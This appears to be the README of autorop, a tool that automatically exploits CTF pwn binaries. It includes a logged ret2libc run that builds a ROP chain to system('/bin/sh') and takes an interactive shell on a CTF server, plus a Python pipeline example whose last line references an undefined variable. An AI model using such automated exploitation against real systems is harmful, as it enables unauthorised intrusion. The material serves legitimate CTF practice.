autorop
=======

|docs| |Test status| |MIT license|

Automated solver of classic CTF pwn challenges, with flexibility in mind.

Official documentation can be found at `autorop.readthedocs.io <https://autorop.readthedocs.io>`_.

Disclaimer
----------

Do not use this software for illegal purposes. This software is intended to be used in legal Capture the Flag competitions only.

Command line
------------

.. code-block:: text

    $ python -m autorop.autorop
    Usage: autorop BINARY [HOST IP]

.. code-block:: text

    $ python -m autorop.autorop tests/bamboofox/ret2libc bamboofox.cs.nctu.edu.tw 11002
    [+] Opening connection to bamboofox.cs.nctu.edu.tw on port 11002: Done
    [*] '/data/Projects/autorop/tests/bamboofox/ret2libc'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    [*] Pipeline [1/4]: corefile
    ...
    [*] Pipeline [4/4]: system_binsh
    [*] Loaded 151 cached gadgets for '.autorop.libc'
    [*] 0x0000:       0xf7e09e70 system(0xf7f29fcc)
        0x0004:       0xf7df7bfa <adjust @0xc> add esp, 4; ret
        0x0008:       0xf7f29fcc arg0
        0x000c:        0x80484ed main()
    [*] Switching to interactive mode
    Hello!
    The address of "/bin/sh" is 0x804a02c
    The address of function "puts" is 0xf7e2eda0
    $ wc -c /home/ctf/flag
    57 /home/ctf/flag


API
---

Importing autorop automatically does a ``from pwn import *``, so you can use all of `pwntools' goodies <https://docs.pwntools.com/en/latest/>`_.

Central to autorop's design is the `pipeline <https://en.wikipedia.org/wiki/Pipeline_(software)>`_. Most functions take in a ``PwnState``, mutate it, and pass it on to the next function. This allows great simplicity and flexibility.

See how the below example neatly manages to "downgrade" the problem from something unique, to something generic that the ``classic_printf`` pipeline can handle.

.. code-block:: python

    from autorop import *

    BIN = "./tests/tjctf_2020/stop"


    def send_letter_first(t, data):
        # the binary expects us to choose a letter first, before it takes input unsafely
        t.sendline("A")
        # avoid messing up output by cleaning it of whatever "A" did
        t.clean(constants.CLEAN_TIME)
        # send actual payload
        t.sendline(data)
        # clean output so generic output gets out of the way
        t.recvuntil(b"Sorry, we don't have that category yet\n")


    # in this case a function is overkill,
    # but demonstrates the flexibility of custom pipelines
    def set_overwriter(state):
        state.overwriter = send_letter_first
        return state


    # create a starting state
    s = PwnState(BIN, process(BIN))

    # build a custom pipeline - base classic pipeline, with printf for leaking
    state = pipeline(s, set_overwriter, turnkey.classic(leak=leak.printf))

    # switch to interactive shell which we got via the exploit
    result.target.interactive()

.. |docs| image:: https://readthedocs.org/projects/autorop/badge/
    :target: https://autorop.readthedocs.io

.. |Test status| image:: https://github.com/mariuszskon/autorop/workflows/autorop%20test/badge.svg
    :target: https://github.com/mariuszskon/autorop/actions?query=workflow%3A%22autorop+test%22

.. |MIT license| image:: https://img.shields.io/badge/license-MIT-blue.svg
    :target: https://github.com/mariuszskon/autorop/blob/master/LICENSE
